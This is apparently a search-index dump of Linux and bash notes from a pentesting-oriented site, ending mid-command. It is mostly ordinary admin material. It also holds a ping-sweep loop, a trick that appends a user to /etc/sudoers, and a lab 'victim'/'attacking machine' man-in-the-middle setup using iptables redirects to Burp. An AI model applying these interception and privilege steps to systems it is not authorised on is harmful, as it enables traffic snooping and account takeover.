battery_time=$(cat /sys/class/power_supply/BAT0/capacity) # The variables can then be used like this echo \"$battery_time\" Iterate over a file # This script will iterate over a file and echo out every single line: #!/bin/bash for line in $(cat file.txt);do echo $line done Another way of writing is this: #!/bin/bash while read p; do echo $p done <file.txt For-loops # #!/bin/bash for ((i = 0; i < 10; i++)); do echo $i done Another way to write this is by using the program seq . Seq is pretty much like range() in python. So it can be used like this: #!/bin/bash for x in `seq 1 100`; do echo $x done If statement # $1 here represent the first argument. if [ \"$1\" == \"\" ]; then echo \"This happens\" fi If/Else # #!/bin/bash if [ \"$1\" == \"\" ]; then echo \"This happens\" else echo \"Something else happens\" fi Functions # #!/bin/bash function myfunction { echo \"hello world\" } Command line arguments # Command line arguments are represented like this #!/bin/bash $1 This is the first command line argument. Daemonize an execution # If you do a ping-sweep with host the command will take about a second to complete. And if you run that against 255 hosts I will take a long time to complete. To avoid this we can just deamonize every execution to make it faster. We use the & to daemonize it. #!/bin/bash for ip in $(cat ips.txt); do ping -c 1 $ip & done Use the output of command # It has happened to me several times that I want to input the output of a command into a new command, for example: I search for a file, find three, and take the last line, which is a path. Now I want to cat that path: #!/bin/bash locate 646.c | tail -n 1 This can be done like this: #!/bin/bash cat $(locate 646.c | tail -n 1)","title":"Bash Scripting"},{"location":"basics_of_linux/bash_scripting/#bash-scripting","text":"","title":"Bash-scripting"},{"location":"basics_of_linux/bash_scripting/#variables","text":"# There can't be any space between the variable name and the equal sign. It has to be varname=command battery_time=$(cat /sys/class/power_supply/BAT0/capacity) # The variables can then be used like this echo \"$battery_time\"","title":"Variables"},{"location":"basics_of_linux/bash_scripting/#iterate-over-a-file","text":"This script will iterate over a file and echo out every single line: #!/bin/bash for line in $(cat file.txt);do echo $line done Another way of writing is this: #!/bin/bash while read p; do echo $p done <file.txt","title":"Iterate over a file"},{"location":"basics_of_linux/bash_scripting/#for-loops","text":"#!/bin/bash for ((i = 0; i < 10; i++)); do echo $i done Another way to write this is by using the program seq . Seq is pretty much like range() in python. So it can be used like this: #!/bin/bash for x in `seq 1 100`; do echo $x done","title":"For-loops"},{"location":"basics_of_linux/bash_scripting/#if-statement","text":"$1 here represent the first argument. if [ \"$1\" == \"\" ]; then echo \"This happens\" fi","title":"If statement"},{"location":"basics_of_linux/bash_scripting/#ifelse","text":"#!/bin/bash if [ \"$1\" == \"\" ]; then echo \"This happens\" else echo \"Something else happens\" fi","title":"If/Else"},{"location":"basics_of_linux/bash_scripting/#functions","text":"#!/bin/bash function myfunction { echo \"hello world\" }","title":"Functions"},{"location":"basics_of_linux/bash_scripting/#command-line-arguments","text":"Command line arguments are represented like this #!/bin/bash $1 This is the first command line argument.","title":"Command line arguments"},{"location":"basics_of_linux/bash_scripting/#daemonize-an-execution","text":"If you do a ping-sweep with host the command will take about a second to complete. And if you run that against 255 hosts I will take a long time to complete. To avoid this we can just deamonize every execution to make it faster. We use the & to daemonize it. #!/bin/bash for ip in $(cat ips.txt); do ping -c 1 $ip & done","title":"Daemonize an execution"},{"location":"basics_of_linux/bash_scripting/#use-the-output-of-command","text":"It has happened to me several times that I want to input the output of a command into a new command, for example: I search for a file, find three, and take the last line, which is a path. Now I want to cat that path: #!/bin/bash locate 646.c | tail -n 1 This can be done like this: #!/bin/bash cat $(locate 646.c | tail -n 1)","title":"Use the output of command"},{"location":"basics_of_linux/basics_of_linux/","text":"Basics of linux # This is a huge chapter. I could divide it up in many subchapters but I like to have it all at one place so I can just do ctr-f , and search for whatever I am looking for. 1. The Shell - Bash # The shell, or the terminal is a really useful tool. Bash is the standard shell on most Linux distros. One really useful trick when working with bash is to search for old commands that you have used. You can access this search function by doing ctr-r in the terminal. The configuration file for the bash shell is ~./bashrc Navigating # pwd - Print working directory cd - Change directory cd ~ - Change directory to your home directory cd - - Go back to previous directory Looking at files # ls - List files in directory ls -ltr - Sort list by last modified. -time -reverse file - Show info about file. What type of file it is. If it is a binary or text file for example. cat - Output content of file. less - Output file but just little bit at a time. Use this one. Not more . Use /searchterm to search. It is the same command as in vim. n to scroll to next search result. Press q to quit. more - Output file but just little bit at a time. less is better. Working with files # touch - Create a new file. cp - Copy mkdir - Make directory. # Make entire directory structure mkdir -p new/thisonetoo/and/this/one rm - Remove file # Remove recursively and its content. Very dangerous command! rm -rf ./directory Watch the command destroy an entire machine: https://www.youtube.com/watch?v=D4fzInlyYQo rmdir - Remove empty directory A little bit of everything # history - Show commands history sudo List what rights the sudo user has. sudo -l Sudo config file is usually /etc/sudoers Finding files # There are mainly three ways to find files on Linux: find , locate , and which . Find # Find is slower than locate but a lot more thorough. You can search for files recursively and with regex and a lot of other features. # This will send all permissions denied outputs to dev/null. find / -name file 2>/dev/null # Search incasesensitive, that contains the word file. find / -iname *file* 2>/dev/null Locate # Locate is really fast because it relies on an internal database. So in order to have it updated you need to run: sudo updatedb Then you can easily find stuff like this: locate filename Which # Outputs the path of the binary that you are looking for. It searches through the directories that are defined in your $PATH variable. which bash # Usually outputs: /bin/bash Creating custom bash functions # If you want to create a new command from other commands, and be able to invoke that command from your terminal, there are a few different way of doing that. One way is write a bash-script, and then move that script to one of your folders in your $PATH variable. The other way is to simply write a function in your .bashrc file. You can then invoke that function from anywhere in your terminal. So for example, if you want to ssh into a machine, but you are tired of having to write the whole command, you can just add this function in your .basrhrc file: function connecttossh { ssh user@192.168.1.111 } Then you need to source the file, so that it becomes updated: source ./.bashrc Now you can just write connecttossh and the function will be executed. 2. Editing text # First let's just clear out something about standard streams , or I/O -streams. Standard streams are the streams that are used to interact between the human computer-user and the machine. There are three standard streams: standard input (stdin), standard output (stdout), and standard error (stderr).The stdin stream can be seen as an abstractions of the real keyboard input. So when you issue a command/program that requires input the program does not read straight from the keyboard input, instead it reads from the file STDIN. Stdin # Stdin is the data that gets inputed into the program. An example of a program that requires stdin data is cp . In order for the program to do anything it needs input data. For example cp file1 copy_of_file1 . Here file1 and copy_of_file1 is the stdin. So the default Stdin comes from the STDIN-file that is a text-file representation of the keyboard input. But often times we do not want to input stuff from the keyboard, sometimes we want to input something into a program that comes from another file. That is when we can use redirection symbol: > . So an example could be cat < my_text_file.txt . The data from my_text_file.txt will now be used as input instead of the keyboard input. The file descriptor for stdin is: 0 Stdout # Stdout is the data that get ouputed from the program. For example, when you use the command cat file1 that data/text that gets outputed is the stdout The same with the program ls . Not all programs have stdout. For example when you use mv or cp successfully you get no stdout back from the program. The stdout can be redirected to another file by using these symbols > and >> . So now we can do the following: ls > result_of_ls.txt # now the result will be written to the file result_of_ls.txt ls >> result_of_ls.txt # This will append the data to the bottom of the file result_of_ls.txt Another incredibly useful feature is the pipe feature, reprsented with this symbol | . It will take the stdout and redirect it into another program. Here is an example: ls -la | less This will take the stdout from ls -la and forward/redirect it into the less program. Using the pipe you can now chain different commands. The file descriptor for stdout is: 1 Stderr # Stderr is the stream used for outputting error messages. So if a program fails for whatever reason. For example, if we try to copy a file that does not exist, this will be the stdrr output: cp thisfiledoesnotexist aaaaaaaaaa cp: cannot stat 'thisfiledoesnotexist': No such file or directory This is a common way for stderr to present itself, just straight out into the terminal. But sometimes stderr gets sent to a log file. Stderr is useful because with it we can separate between stdout and stderr . However, to the eye it might be difficult to distinguish what output is stdout and what output is stderr . One easy way to determine is the output is stderr or stdout is to simply redirect it into a file. Because by default you only redirect stdout , and not stderr . cp thisfiledoesnotexist aaaaaaaaaa > result.txt cp: cannot stat 'thisfiledoesnotexist': No such file or directory # If we now look at result.txt we will find that it is empty. Since the error-text we recieved could not be redirected into the textfile, since it is stderr and not stdout. Filters # There are certain programs that are especially useful to use together with pipes. They can also be used as stand-alone programs but you will often see them together with pipes. sort sort test.txt uniq To remove any duplicated lines and output all lines but only once. sort -u test.txt sort test.txt | uniq cat filename | sort -u > newFileName grep head tail tr sed Editing text # sed # Can perform basic editing on streams, that is to say, text. Remove first line of file/stream sed \"1d\" cut # Cut by column This is a useful command to cut in text. Let's say that we have the following text, and we want to cut out the ip-address. 64 bytes from 192.168.0.1: icmp_req=1 ttl=255 time=4.86 ms cut -d\" \" -f4 -d stands for delimiter. and -f for field. tr - Translate # Transform all letter into capital letters tr \"[:lower:]\" \"[:upper:]\" < file1 > file2 Example Remove character # Remove characters cat file.txt | tr -d \".\" # Remove and replace # Remove all dots and replace them with underscore. cat file.txt | tr \".\" \"_\" http://www.thegeekstuff.com/2012/12/linux-tr-command/ awk # So awk is an advanced tool for editing text-files. It is its own programming language to it can become quite complex. Awk iterates over the whole file line by line. This is the basic structure of an awk command awk '/search_pattern/ { action_to_take_on_matches; another_action; }' file_to_parse The search pattern takes regex. You can exclude the search portion or the action portion. This just prints every line of the file. awk '{print}' filename Filtering out specific ip-address: awk '/172.16.40.10.81/' error.log Now we want to print out the fourth column of that file, we can just pipe this to cut, but we can also use awk for it, like this: awk '/172.16.40.10.81/ {print $4}' error.log # Another example awk '{print $2,$5;}' error.txt This prints columns 2 and 5. We can use the -F flag to add a custom delimiter. awk -F ':' '{print $1}' test.txt So if you are manipulating some text you might want to start the output with some info about the columns or something like that. To do that we can use the BEGIN-keyword. awk 'BEGIN {printf \"IP-address \\tPort\\n\"} /nop/ {print $3}' test.txt | head awk 'BEGIN{printf \"IP-address \\tPort\\n\"} /nop/ {print $3} END {printf \"End of the file\\n\"}' test.txt | tail Here we are printing IP-address PORT to the first line of the file. 3. User management # There are two commands to add a user in linux: adduser or useradd. adduser is a perl-script that facilitate the process, and useradd is the native linux binary. To add a user we do: adduser NameOfUser useradd nameOfUser To add user to sudo-group: adduser NameOfUser sudo usermod -aG sudo NameOfUser You might have to reboot for it to take effect. On some machines we might not be able to edit the sudoers file because we don't have an interactive shell, in this case can you can just redirect the text into the file, like this: echo \"username ALL=(ALL) ALL\" >> /etc/sudoers Check which users are in the sudo group: cat /etc/group | grep sudo Switch user in terminal: su NameOfUser Remove/delete user: sudo userdel NameOfUser 4. Permissions # ls -la Shows all the files and directories and their permission settings. drwxrwxrwt 2 root root 4,0K ago 3 17:33 myfile Here we have 10 letters in the beginning. The first one d shows that it is a directory. The next three letters are for read, w for write and x for execute. The first three belong to the owner, the second three to the group, and the last three to all users. https://linuxjourney.com/lesson/file-permissions 5. Processes # To display information regarding the systems processes you can use the ps command. ps -aux -a stands for all -u stands for all processes by all users -x stands for all processes that don't run a tty If you run this command you will probably see a pretty big output. In the column for command you will see what command has been run. Every process has a Process Identification Number ( PID ). Something you will also see in the output. All of theses processes can actually be found in /proc . You just go to /proc/[pid] . In /proc you can find information about the system, and you can actually change the system if you change those files! But more on that later. What I wanted to explain is that if we look at the output from ps we see that some commands are in brackets. Like this: root 10 0.0 0.0 0 0 ? S ene14 0:00 [watchdog/0] root 11 0.0 0.0 0 0 ? S ene14 0:00 [watchdog/1] root 12 0.0 0.0 0 0 ? S ene14 0:00 [migration/1] root 13 0.0 0.0 0 0 ? S ene14 0:00 [ksoftirqd/1] Those are usually kernel processes, and you can safely assume that no user has started them. If you want to monitor processes in real time you can use top or htop . top comes preinstalled on most distros. But htop is really a lot nicer. For htop the F1-10 keys might trigger OS-events. So you can use the shortcuts instead. Shortcut Key Function Key Description h F1 Invoke htop Help S F2 Htop Setup Menu / F3 Search for a Process I F4 Invert Sort Order t F5 Tree View > F6 Sort by a column [ F7 Nice \u2013 (change priority) ] F8 Nice + (change priority) k F9 Kill a Process q F10 Quit htop http://www.thegeekstuff.com/2011/09/linux-htop-examples/ 6. Packages # Something that difference Linux from windows is how it handles installing new software. In windows you usually have to google around and then click on random scary download buttons that might fuck up your computer, or not. It's like a constant lottery where you win by no installing malware. In Linux that is usually not really an issue. That is because distros have their own software repositories from where you can download your software. This is kind of like an app-store except everything is free. The different major branches of teh GNU/Linux OS have their own software repositories. Ubuntu has their own, debian has their own, and so on. Different distros also have their own package-amangers. For example, Debian and ubuntu uses apt , while Redhat uses rpm , and Arch uses pacman . You should strick to your own package-manager, because even though chaning package-manager is possible it will probably just cause you more headache than benefits. Install package # Example of how to install something with apt: sudo apt-get install nmap If you only have a .deb file you do this to install from the terminal: sudo dpkg -i /path/to/deb/file sudo apt-get install -f Remove packages # This can be tricky. First find the package dpkg --list Then you find it in your list. sudo apt-get --purge remove nameOfProgram When you remove some package it might have requires some other dependencies. To remove those you run sudo apt-get autoremove Organizing your $path variable # I am talking about debian/ubuntu here. On other systems I don't know. You can define your path in /etc/environment . If you don't have it you can create it and add the path like this: source /etc/environment && export PATH If you are using zsh (which you should) you have to add it here sudo vim /etc/zsh/zshenv And add this line somewhere: source /etc/environment Adding a path # This is a non-persistent way to add binaries to your path. Might be useful if you have entered a system that has limited binaries in the path. export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin Installing custom packages # If you download a package that is not in the official repository you can put the binary in /opt . That is good place to put your binaries. Now you need to add that path to your path-variable. Remember how we set that in /etc/environment . So now open up that file and add /opt to it, so i looks like this. PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/opt\" I always add custom binaries last. That means that if we have two binaries with the same name the machine will first select the original binary. This way you won't have to fear screwing up, by accidentally creating a new ls binary for example. 7. Cronjobs # There are two ways to configure cronjobs. The first one is by putting scripts in the following folders. /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly The second way is to write the command in the crontab # list cronjobs crontab -l # Edit or create new cronjobs crontab -e 8. Devices/disks/partitions # First some terminology. A drive is a physical storage device, just as a hard disk, solid state drive, or usb. In Linux these drives are represented as special file system objects called \"device\". They are found under /dev .A physical storage unit, a drive, can be divided up in to multiple logical storage units, these are called partitions . So they are just digital divisions of the drive. In linux a device are often named something like sda, sdb, sdc. And the partions of those devices are numbered. So one partion might be called sda1 , and another sda2 . These can then be found under /dev/sda1 and /dev/sda2 . You can view the devices and their partions with the command lsblk Formating disks # If you want to do it the easy way, just open gnome-disks . To format disks we are going to use the program parted . It can be used with its own shell or by running commands. So you can just run parted, and you will enter the parted interface. But here we are going to run the commands instead. # Make sure you know which device you are working with, they can change name between boots lsblk Partition standard First we have to choose a partition standard. The modern and mostly used is gpt, and older is msdos. # This will destroy all the data on the on the disk sudo parted /dev/sda mklabel gpt Create a new partition sudo parted --align optimal /dev/sda mkpart primary ext4 0% 100% This command creates a new partition (mkpart), which is of type primary, that takes up the space between 0-100%. Which means we will only have one partition. Now you can see your new partition with lsblk . Format the partition with a specific filesystem Now that we have a partition we need to add a filesystem to it.There are many different types of filesystems. ext4 is common for linux. While windows uses NTFS, and mac uses HFS Plus. exFAT can be understood by all three OS:s, something that might be useful to USB:s. # For linux sudo mkfs.ext4 /dev/sda1 # Supposedly work on linux, mac and windows. But fails for me on my tests on Mac sudo mkfs.vfat /dev/sda1 # To use UDF (universal disk format) that should also work on all OS # You first need to install apt-get install udftools. Then you do: mkudffs /dev/sda1 Remove partition # if you want to remove partition 1 sudo parted /dev/sda rm 1 Mount it Now you can just mount the parition somewhere on your filesystem # Mount it sudo mkdir /mnt/here sudo mount /dev/sda1 /mnt/here # Unmount it sudo umount /mnt/here List all devices lsblk fdisk -l Encrypt a partition # sudo cryptsetup luksFormat /dev/sda1 Mount an encrypted parition cryptsetup open /dev/sda1 backup Then you mount it: mount /dev/mapper/backup /media/username/back Change encryption passphrase # First find out which device is the encrypted device: lsblk # In type you will see \"crypt\" There are eight slots for passphrases. You can view these slots like this: sudo cryptsetup luksDump /dev/sda3 Add a key: sudo cryptsetup luksAddKey /dev/sda3 Remove a key: sudo cryptsetup luksRemoveKey /dev/sda3 # You are then prompted to input the key/passphrase you want to remove Formatting a USB # In order to format a usb drive we have to do the following. If you have stored sensitive information, or otherwise want to make sure that it is not possible to read removed files from the USB you can overwrite the usb (or any other kind of disk) with zeroes, or just random data. So we can start by doing that, however, first we need to know the device name of the usb. First find out the name of the usb/device. We can to that by looking at the dmesg or tail -f var/log/syslog when we insert the usb. Another way is to run the command lsblk before and after inserting the USB. In my case the usb was called sda, , but for you it might be something else. Make sure you know exactly which device you are working with, otherwise you will completely detroythe wrong device. Then we need to unmount the usb. sudo umount /dev/sda Now we are ready to overwrite it with zeroes. It can be done like this: sudo dd if=/dev/zero of=/dev/sda bs=1k count=2048 status=progress Then we just write a new filesystem to the device: sudo mkfs.ext4 -L \"NameOfVolume\" /dev/sda ext4 works well with linux, vfat and ntfs should work with windows. sudo mkfs.vfat -n \"NameOfVolume\" /dev/sda Create bootable USB # First find out the name of the device. Using dmesg , or lsblk , or something similar. sudo dd bs=4M if=/path/to/input.iso of=/dev/sdX conv=fdatasync status=progress That's it. 9. The Filesystem # The Filesystem Hierarchy Standard # This image is copied from here: http://askubuntu.com/questions/138547/how-to-understand-the-ubuntu-file-system-layout/138551#138551 Difference between sbin and bin # sbin is system binaries. A normal user do not have access to these binaries. It is only root and users with sudo privileges that do. pelle@mymachine:/bin$ ls -la /bin total 4092 drwxr-xr-x 2 root root 4096 2012-02-04 19:12 . drwxr-xr-x 21 root root 4096 2012-02-06 18:41 .. --snip-- -rwxr-xr-x 1 root root 27312 2008-04-04 02:42 cat -rwxr-xr-x 1 root root 45824 2008-04-04 02:42 chgrp -rwxr-xr-x 1 root root 42816 2008-04-04 02:42 chmod -rwxr-xr-x 1 root root 47868 2008-04-04 02:42 chown -rwxr-xr-x 1 root root 71664 2008-04-04 02:42 cp -rwxr-xr-x 1 root root 110540 2007-11-13 05:54 cpio -rwxr-xr-x 1 root root 79988 2009-03-09 09:03 dash -rwxr-xr-x 1 root root 24684 2008-04-04 02:42 echo -rwxr-xr-x 1 root root 40560 2008-02-29 02:19 ed -rwxr-xr-x 1 root root 96440 2007-10-23 16:58 egrep -rwxr-xr-x 1 root root 22192 2008-04-04 02:42 false -rwxr-xr-x 1 root root 5740 2008-02-06 17:49 fgconsole -rwxr-xr-x 1 root root 53396 2007-10-23 16:58 fgrep -rwxr-xr-x 1 root root 8796 2007-11-15 13:01 hostname We have echo, cp, grep. The normal stuff a user needs. In sbin we have binaries that control the system. ls -la /sbin total 5884 drwxr-xr-x 2 root root 4096 2012-02-04 10:01 . drwxr-xr-x 21 root root 4096 2012-02-06 18:41 .. -rwxr-xr-x 3 root root 23840 2008-03-27 13:25 findfs -rwxr-xr-x 1 root root 20020 2008-03-27 13:25 fsck -rwxr-xr-x 1 root root 15168 2008-09-26 08:43 getty -rwxr-xr-x 1 root root 375 2009-12-10 10:55 grub-install lrwxrwxrwx 1 root root 6 2012-02-04 09:51 halt -> reboot -rwxr-xr-x 1 root root 69228 2008-03-28 18:26 hdparm -rwxr-xr-x 1 root root 31620 2008-09-26 08:43 hwclock -rwxr-xr-x 1 root root 61808 2007-12-13 05:51 ifconfig -rwxr-xr-x 2 root root 27372 2007-09-19 20:25 ifdown -rwxr-xr-x 2 root root 27372 2007-09-19 20:25 ifup -rwxr-xr-x 1 root root 89604 2008-04-11 09:50 init -rwxr-xr-x 1 root root 47448 2008-01-28 08:49 ip6tables -rwxr-xr-x 1 root root 51680 2008-01-28 08:49 ip6tables-restore -rwxr-xr-x 1 root root 51644 2008-01-28 08:49 ip6tables-save -rwxr-xr-x 1 root root 10948 2007-12-13 05:51 ipmaddr -rwxr-xr-x 1 root root 47480 2008-01-28 08:49 iptables Mount # So everything on the linux-filesystem belongs to some part of the filesystem-tree. So if we plug in some device we need to mount it to the filesystem. That pretty much means that we need to connect it to the filesystem. Mount is like another word for connect. So if you want to connect a CD-rom or USB to your machine. You need to mount it to a specific path on the filesystem. So if you plug in the usb it might be accessible at /dev/usb . But that it not enough for you to be able to browse the usb content. You need to mount it. You do this by writing mount /dev/usb /media/usb Or whereever you want to mount it. So when you click on Eject or Safetly remove you are just unmounting. umount /media/usb Knowing how to mount and unmount might be useful if you want to get access to a remote NFS-directory. You will need to mount it to your filesystem to be able to browse it. It is possible that the disk is not known as /dev/usb . If that is the case you can run sudo fdisk -l And see if you can find your device, and look for the address. Then you mount it like this (or with the correct path) sudo mount /dev/sda1 Mount crypto-volume # cryptsetup open /dev/sda1 backup Then you mount it: mount /dev/mapper/backup /media/username/back Create your of filesystem # In some cases it might be useful to create your own disk. Maybe for attaching to a virtual machine, or maybe to facilitate a backup. It is just a easy nice little container to have. It just requires two easy steps. Create a chunk in memory truncate -s 100MB nameOfFile Attach a filesystem to file mkfs.ext4 ./nameOfFile Mount it to your filesystem sudo mount ./nameOfFile /mnt/blabla 10. Controlling services # Systemctl # Systemctl can be used to enable and disable various services on your linux machine. Start ssh systemctl start ssh systemctl status ssh systemctl stop ssh You can verify that the service is listening for connection by running network status. netstat -apnt Make ssh start upon boot systemctl enable ssh systemctl enable apache2 Init.d # Init.d is just a wrapper around Systemctl. I prefer it. /etc/init.d/cron status /etc/init.d/cron start /etc/init.d/cron stop rcconf # This is a tool to control services more easily, what is running upon boot and so on. 11. Kernel # The Kernel is responsible for talking between the hardware and the software, and to manage the systems resources. The Linux Kernel is a monolithic kernel, unlike the OSX and the Windows kernels which are hybrid. You can find the kernel file in /boot . It might look like something like this vmlinuz-4.4.0-57-generic . In the beginning of time the kernel was simply called linux . But when Virtual Memory was introduced they changed the name to vmlinux to reflect that the kernel could handle virtual memory. When the kernel later became too big it was compressed using zlib , therefore the name was changed to vmlinuz . The Linux Kernel differs from Windows in that it contains drivers by default. So you don't have to go around looking for drivers like you do on windows when you want to install a printer, or something like that. It is really easy to upgrade to the latest Linux kernel, all you have to do tis this: sudo apt-get update && sudo apt-get dist-upgrade # or sudo apt-get update && sudo apt-get upgrade If you are using a distro that is Long Term Supported (LTS). You will not get the latest Kernel version, but you will get the latest Long Term Supported version. 14. Logging # Logs can be viewed here on debian distros /var/log/ 16. Network basics # If you use standard desktop installation for Ubuntu or Debian you get NetworkManager included, which handles your network connections, wire and wireless. NetworkManager is made to be easy to use, and \"just work\". And most of the time it does. But sometimes when you want to configure stuff on your own, for whatever reason, it can be a hassle. So for the rest of this chapter I am just going to assume that you have stopped, removed or disabled NetworkManager. # Stop NetworkManager sudo systemctl stop NetworkManager.service # Start NetworkManager sudo systemctl start NetworkManager.service # Disable it so it won't start at boot sudo systemctl disable NetworkManager #Enable it so it will start at boot sudo systemctl disable NetworkManager Network cards (NIC) are identified by their mac address, hosts by theirip address andapplications by their port number. In a nutshell what you need to know # Things you really need to know are: # Configuration files /etc/network/interfaces /etc/resolve.config # Tools ip ip route dhclient wpa_supplicant iptables netstat dnsmasq Configure Network Interface Cards (NIC) # On debian NIC:s are defined and configured in /etc/network/interfaces . # automatically start eth0 on boot auto eth0 # give the eth0 an ip through dhcp iface eth0 inet dhcp # start up the loopback interface auto lo iface lo inet loopback # A bridge called br1 - can be called whatever. # This bridge has a static ip auto br1 iface br1 inet static address 192.168.2.1 netmask 255.255.255.0 broadcast 192.168.2.255 bridge_ports none Take a interface up and down / start and stop It is recommended to take a interface down before configuring it. # ifup eth0 ifdown eth0 # You can also use ip sudo ip link set dev eth0 down sudo ip link set dev eth0 down # You can also use ifconfig to bring an interface up and down. The difference is that ifconfig # will use the current configuration, and not take into account changes from /etc/network/interfaces. # So use ifup and ifdown! ifconfig eth0 up ifconfig eth0 down Configure an interface with ip or ifconfig If you want to configure an interface only temporarly you can use ip and ifconfig . The changes will not survive a reboot. Ifconfig is old and deprecated on some systems. So use ip instead. But they do basically the same thing. Route # Where packets are send in a network depends on the routing of the routing. Every node that the packet passes in its travel to its destination has a routing table defined, that says where the packet should be directed next. The most simple example is how the traffic of a home network is sent to the router, and then from there forwarded on to somewhere else on the internet. How every host should forward the packets are defined in the linux kernel routing table. You can see the routing table by running this command: route ip route netstat -r I think that the most useful of these commands is route, since it includes the column names of the table. Here is an example of the output: Destination Gateway Genmask Flags Metric Ref Use Iface default 192.168.2.1 0.0.0.0 UG 0 0 0 ens3 192.168.2.0 0.0.0.0 255.255.255.0 U 0 0 0 ens3 So let's image that we don't have any routing rules at all. It is completely empty. Like this: Destination Gateway Genmask Flags Metric Ref Use Iface But we have network interface connected, called eth0. If we now try to ping the router (the gateway) on the network, we get this result: ~ ping 192.168.2.1 connect: Network is unreachable At this point we can't even add a route to the gateway. Because the network is unreacheable. So we need to hook outselfs up to the network first. route add -net 192.168.2.0 netmask 255.255.255.0 dev eth0 Now our table looks like this: Destination Gateway Genmask Flags Metric Ref Use Iface 192.168.2.0 0.0.0.0 255.255.255.0 U 0 0 0 eth0 We still can't ping anything out in the internetz- That's because we are not reaching our gateway (router), since we haven't configured it yet. route add default gw 192.168.2.1 or ip route add default via 192.168.2.1 Remember that these routes will only be temporary. Example - Man in the middle a host # It is often useful to man in the middle all traffic from a machine, to see what requests and stuff it does. Let's say that the scenario is that the victim-machine is connected to the mitm-machine by ethernet cable. This can be either a physical cable or thought a virtual machine. Victim machine On the victim machine we don't have network-manager installed. And out /etc/network/interfaces has nothing in it except for: auto lo iface lo inet loopback When we run ip addr we get the following result: root@deb64:~# ip a 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: ens3: <BROADCAST,MULTICAST> mtu 1500 qdisc pfifo_fast state DOWN group default qlen 1000 link/ether 12:34:00:a9:fc:4a brd ff:ff:ff:ff:ff:ff So our network interface ens3 does not have an ip-address and it is down. So let's first give it an ip-address, now remember that this ip-address will only be temporary, and will disappear on next reboot. If you want to make it permanent you need to define it in /etc/network/interface Give interface an ip-address ip addr add 192.168.150.2/24 dev ens3 # Here we give it the ip-address 192.168.150.2 with netmask 255.255.255.0 (/24), and we # give it to the device/interface ens3 Now we can start the interface, or \"bring it up\" as it is called: ip link set ens3 up # ifup and ifdown will not work When we bring up the interface the routing table will automatically get populated. root@deb64:~# ip r 192.168.150.0/24 dev ens3 proto kernel scope link src 192.168.150.2 Add default gateway But we are still not able to reach the internet since we have not defined a default gateway yet. So let's do that. ip route add default via 192.168.150.1 dev ens3 If we look at the routing table now we can see our new default gateway. root@deb64:~# ip route default via 192.168.150.1 dev ens3 192.168.150.0/24 dev ens3 proto kernel scope link src 192.168.150.2 Now we are done setting up the victim machine. Attacking machine First we need to give our machine the ip-address of the default gateway, so that the victim will connect to the attacking machine. ip addr add 192.168.150.1/24 dev ens3 Now we just need to configure the NATing. iptables -t nat -A POSTROUTING -j ACCEPT This is all we have to do. If we now do a curl icanhazip.com from our victim machine, we can see the traffic flying by with tcpdump in our attacker-machine. However, we might want to inspect the traffic in burp-suite, or some other proxy tool. In ordet to do that we can redirect specific traffic into our proxy with the help of our friend iptables. iptables -t nat -A PREROUTING -i ens3 -s 192.168.150.2 -p tcp -m tcp --dport 443 -j REDIRECT --to-ports 8080 iptables -t nat -A PREROUTING -i ens3 -s 192.168.150.2 -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 8080 iptables -t nat -A PREROUTING -i ens3 -s 192.168.150.2 -p tcp -m tcp --dport 53 -j REDIRECT --to-ports 53 Now we just have to configure burp-suite a little bit. Go to Proxy > Options > Proxy Listeners > Edit > Binding > All interfaces Go to: Proxy > Options > Proxy Listeners > Edit > Request handling > Support invisible proxy Now if you do the following from the victim machine: curl icanhazip.com You will see the request in burp suite. If you want to mitm windowsyou just need to change the ip and gateway to 192.168.15.2 and 192.168.150.1. Wireless - wpa_supplicant # So if you manage to disable networkManager you can connect to a wireless network using wpa_supplicant instead. I think that is what NetworkManager actually uses underneith. First we need to list all Access Points. sudo iwlist wlan0 scan Then we need to create a config-file for our specific access-point. We can do that with wpa_passphrase, after running the command we are asked to write the password, which also gets stored in the config file. In plaintext. wpa_passphrase NameOfWIfi > wpa.conf Now we just connect to the AP: wpa_supplicant -Dwext -iwlan0 -c/etc/wpa_supplicant/wpa.conf After this you do not have an IP-address, or you might not have a updated dhcp lease. So first you need to release the current lease. sudo dhclient wlan0 -r # Then get a new dhcp lease sudo dhclient wlan0 Now you should be able to surf the internetz. Netstat - Find outgoing and incoming connections # Netstat is a multiplatform tool. So it works on both mac, windows and linux. $ netstat -antlp Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 mymachine:domain *:* LISTEN - tcp 0 0 localhost:ipp *:* LISTEN - tcp 0 0 localhost:27017 *:* LISTEN - tcp 0 0 localhost:mysql *:* LISTEN - A few interesting things to observe here is that my machine is using any port over 1024 to connect to the outside. So it is not like just because we communicate with https and connect to port 443 that we use that port on our machine. On our machine it can be any port (over 1024) and usually any port over 10000. Find out what services are listening for connection on your machine Flags -a # All -n # show numeric addresses -p # show port -t # tcp netstat -anpt To easily check out what process is using lots of bandwidth you can use nethogs. sudo apt-get install nethogs nethogs Or you can use tcpdump, or iptables. Every listening process of course has a PID, but unless you are root you can't might not see them all. Firewall - Iptables # Iptables is a firewall tool in linux. A firewall is basically a tool that scans incoming and/or outgoing traffic. You can add rules to the iptables to filter for certain traffic. Types of chains # So you can filter traffic in three different ways input , forward , and output . These are called three different chains. INPUT This is for incoming connections. If someone wants to ssh into your machine. Or a web-server responds to your request. FORWARD This chain is used for traffic that is not aimed at your machine. A router for example usually just passes information on. Most connections are just passing through. As you can see this will probably not be used so much on your machine, as a normal desktop or a server doesn't router that much traffic. OUTPUT This chain is used for outgoing traffic. Active rules # To view your active rules you do iptables -L # It will output something like this Chain INPUT (policy ACCEPT) target prot opt source destination Chain FORWARD (policy ACCEPT) target prot opt source destination Chain OUTPUT (policy ACCEPT) target prot opt source destination So as we can see the current policy is to accept all traffic in all directions. If you for some reason has been tampering with the iptables and maybe fucked up. This is how you return it to the default setting, accepting all connections iptables --policy INPUT ACCEPT iptables --policy OUTPUT ACCEPT iptables --policy FORWARD ACCEPT If you instead want to forbid all traffic you do iptables --policy INPUT DROP iptables --policy OUTPUT 